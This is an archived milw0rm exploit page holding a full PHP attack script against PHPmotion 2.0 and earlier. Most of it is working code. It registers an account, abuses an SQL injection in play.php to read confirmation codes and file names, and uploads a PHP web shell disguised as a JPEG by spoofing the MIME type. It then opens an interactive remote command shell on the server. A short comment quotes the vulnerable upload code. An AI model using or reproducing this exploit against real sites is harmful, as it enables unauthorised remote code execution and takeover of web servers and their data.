<html><head><title>PHPmotion <= 2.0 (update_profile.php) Remote Shell Upload Exploit</title></head><pre>&lt;?php

/*
	-----------------------------------------------------------------
	PHPmotion &lt;= 2.0 (update_profile.php) Remote Shell Upload Exploit
	-----------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.phpmotion.com/
	details..: don't works on windows platforms due to $_FILES['ufile']['tmp_name'] is stripslashed

	[-] vulnerable code in /update_profile.php
	
	255.	    // START OF FILE UPLOAD AND SECURITY CHECK
	256.	    $limit_size = $config['maximum_size'];//you can change this to a higher file size limit (this is in bytes = 2MB apprx)
	257.	    $random = randomcode();//create random number
	258.	    $uniquename1 = $random . $_FILES['ufile']['name'];//add random number to file name to create unique file
	259.	    $uniquename = mysql_real_escape_string($uniquename1);
	260.	    $path = installation_paths();
	261.	    $path = $path . &quot;/pictures/&quot; . $uniquename;
	262.	
	263.	    if ($_FILES) {
	264.	        // Store upload file size in $file_size
	265.	        $file_size = $_FILES['ufile']['size'];
	266.			//die(&quot;\$file_size = $file_size; \$limit_size = $limit_size;&quot;);
	267.	
	268.	        if ($file_size &gt;= $limit_size) {
	269.	            // Display file size error
	270.	            // ///////////////////////
	271.	            $show = 1;
	272.	            $message_type = $config[&quot;notification_success&quot;];//the messsage displayed at the top coner
	273.	            $error_message = 'Your image is too large. The maximum size allowed is: ' . $config['maximum_size_human_readale'];
	274.	            $blk_id = 1;//html table - error block
	275.	            $template = &quot;templates/main_1.htm&quot;;
	276.	            $inner_template1 = &quot;templates/inner_myaccount_update_profile.htm&quot;;//middle of page
	277.	            $TBS = new clsTinyButStrong;
	278.	            $TBS-&gt;NoErr = true;// no more error message displayed.
	279.	            $TBS-&gt;LoadTemplate(&quot;$template&quot;);
	280.	            $TBS-&gt;Render = TBS_OUTPUT;
	281.	            $TBS-&gt;Show();
	282.	            
	283.	            @mysql_close();
	284.	            die();
	285.	        }
	286.	        else {
	287.	            $filetype = $_FILES['ufile']['type']; &lt;=======
	288.	            if ($filetype == &quot;image/gif&quot; || $filetype == &quot;image/jpeg&quot; || $filetype ==
	289.	                &quot;image/pjpeg&quot;) {
	290.	                // copy file to where you want to store file
	291.	                if (@copy($_FILES['ufile']['tmp_name'], $path)) {
	292.	                }
	293.	                else {
	294.	                    // Display general file copy error
	
	an attacker might be able to upload arbitrary malicious files with .php extension due to the code
	near lines 287-289 will check only the MIME type of the upload request, that can be easily spoofed!
*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

// yes, SQL injection vulnerable too!
function retrive_data($field, $table, $clause)
{
	global $host, $path;
	
	$sql = &quot;-1/**/UNION/**/SELECT/**/&quot;.str_repeat(&quot;1,&quot;,16).&quot;{$field},&quot;.encodeSQL(&quot;yes&quot;).&quot;,1,1,1/**/FROM/**/{$table}/**/WHERE/**/{$clause}%23&quot;;

	$packet  = &quot;GET {$path}play.php?vid={$sql} HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;

	preg_match(&quot;/play.php\?vid=(.*)\&quot;/&quot;, http_send($host, $packet), $match);
	return $match[1];
}

function encodeSQL($sql)
{
	for ($i = 0, $n = strlen($sql); $i &lt; $n; $i++) $encoded .= dechex(ord($sql[$i]));
	return &quot;CONCAT(0x{$encoded})&quot;;
}

function upload()
{
	global $host, $path, $sid, $username;

	login();
	
	print &quot;[-] Trying to upload a shell...\n&quot;;
	
	$payload  = &quot;--o0oOo0o\r\n&quot;;
	$payload .= &quot;Content-Disposition: form-data; name=\&quot;submitted_pic\&quot;\r\n\r\nyes\r\n&quot;;
	$payload .= &quot;--o0oOo0o\r\n&quot;;
	$payload .= &quot;Content-Disposition: form-data; name=\&quot;ufile\&quot;; filename=\&quot;.php\&quot;\r\n&quot;;
	$payload .= &quot;Content-Type: image/jpeg\r\n\r\n&quot;;
	$payload .= &quot;&lt;?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?&gt;\r\n&quot;;
	$payload .= &quot;--o0oOo0o--\r\n&quot;;
	
	$packet  = &quot;POST {$path}update_profile.php HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Cookie: PHPSESSID={$sid}\r\n&quot;;
	$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
	$packet .= &quot;Content-Type: multipart/form-data; boundary=o0oOo0o\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;
	$packet .= $payload;

	http_send($host, $packet);
	
	$user_id = (int) retrive_data(&quot;user_id&quot;, &quot;member_profile&quot;, &quot;user_name=&quot;.encodeSQL($username));
	$file_name = retrive_data(&quot;file_name&quot;, &quot;pictures&quot;, &quot;user_id={$user_id}&quot;);
	
	if (!isset($file_name)) die(&quot;\n[-] Upload failed...\n&quot;);
	else return $file_name;
}

function login()
{
	global $host, $path, $username, $password, $sid;
	
	print &quot;\n[-] Logging in with username '{$username}' and password '{$password}'\n&quot;;
	
	$data	= &quot;user_name_login={$username}&amp;password_login={$password}&amp;submitted=yes&quot;;
	$packet = &quot;POST {$path}login.php HTTP/1.0\r\n&quot;;
	$packet.= &quot;Host: {$host}\r\n&quot;;
	$packet.= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
	$packet.= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$packet.= &quot;Connection: close\r\n\r\n&quot;;
	$packet.= $data;
	$html	= http_send($host, $packet);
	
	preg_match(&quot;/PHPSESSID=([0-9a-f]{32})/i&quot;, $html, $match);
	$sid = $match[1];
	
	if (!preg_match(&quot;/Location: myaccount.php/i&quot;, $html))
	{
		print &quot;[-] Login failed!\n&quot;;
		register();
		login();
	}
}

function register()
{
	global $host, $path, $username, $password;
	
	print &quot;\n[-] Registering new user '{$username}' with password '{$password}'\n&quot;;
	
	// register a new account
	$data	= &quot;user_name={$username}&quot;;
	$data  .= &quot;&amp;password={$password}&quot;;
	$data  .= &quot;&amp;confirm_password={$password}&quot;;
	$data  .= &quot;&amp;email_address=&quot;.md5(time()).&quot;@null.com&quot;;
	$data  .= &quot;&amp;form_submitted=yes&quot;;
	$data  .= &quot;&amp;terms=yes&quot;;
	$packet = &quot;POST {$path}register.php HTTP/1.0\r\n&quot;;
	$packet.= &quot;Host: {$host}\r\n&quot;;
	$packet.= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
	$packet.= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$packet.= &quot;Connection: close\r\n\r\n&quot;;
	$packet.= $data;
	
	http_send($host, $packet);
	
	$code = retrive_data(&quot;random_code&quot;, &quot;member_profile&quot;, &quot;user_name=&quot;.encodeSQL($username));
	if (!isset($code)) die(&quot;\n[-] Registration failed...\n&quot;);
	
	// and confirm the registration
	$packet = &quot;GET {$path}confirm.php?id={$code} HTTP/1.0\r\n&quot;;
	$packet.= &quot;Host: {$host}\r\n&quot;;
	$packet.= &quot;Connection: close\r\n\r\n&quot;;
	
	if (!preg_match(&quot;/registration is now complete/i&quot;, http_send($host, $packet))) die(&quot;\n[-] Registration failed...\n&quot;);
}

print &quot;\n+---------------------------------------------------------------------------+&quot;;
print &quot;\n| PHPmotion &lt;= 2.0 (update_profile.php) Remote Shell Upload Exploit by EgiX |&quot;;
print &quot;\n+---------------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......: php $argv[0] host path\n&quot;;
	print &quot;\nExample....: php $argv[0] localhost /&quot;;
	print &quot;\nExample....: php $argv[0] localhost /phpmotion/\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];

$username = &quot;pr00f_0f&quot;;
$password = &quot;_c0nc3pt&quot;;

$r_path = &quot;pictures/&quot;.upload();

define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));

while(1)
{
	print &quot;\nphpmotion-shell# &quot;;
	$cmd = trim(fgets(STDIN));
	if ($cmd != &quot;exit&quot;)
	{
		$packet = &quot;GET {$path}{$r_path} HTTP/1.0\r\n&quot;;
		$packet.= &quot;Host: {$host}\r\n&quot;;
		$packet.= &quot;Cmd: &quot;.base64_encode($cmd).&quot;\r\n&quot;;
		$packet.= &quot;Connection: close\r\n\r\n&quot;;
		$output = http_send($host, $packet);
		if (!preg_match(&quot;/_code_/&quot;, $output)) die(&quot;\n[-] Exploit failed...\n&quot;);
		$shell = explode(&quot;_code_&quot;, $output);
		print &quot;\n{$shell[1]}&quot;;
	}
	else break;
}

?&gt;

# milw0rm.com [2008-06-25]</pre></html>